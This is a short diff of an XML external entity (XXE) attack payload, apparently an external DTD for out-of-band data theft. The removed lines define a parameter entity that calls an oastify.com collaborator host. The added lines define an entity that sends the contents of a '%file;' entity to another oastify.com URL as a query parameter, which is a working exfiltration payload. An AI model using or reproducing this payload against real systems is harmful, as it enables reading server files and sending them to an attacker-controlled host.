@@ -1,3 +1,2 @@
-   <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://bcr33nubx2uyrd6jvs476wkhf8lz9q5eu.oastify.com;'>">
-   %eval;
-   %exfiltrate;
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://84a0vkm8pzmvjaygnpw4ytce75dw1n3bs.oastify.com?file=%file;'>"> %all;
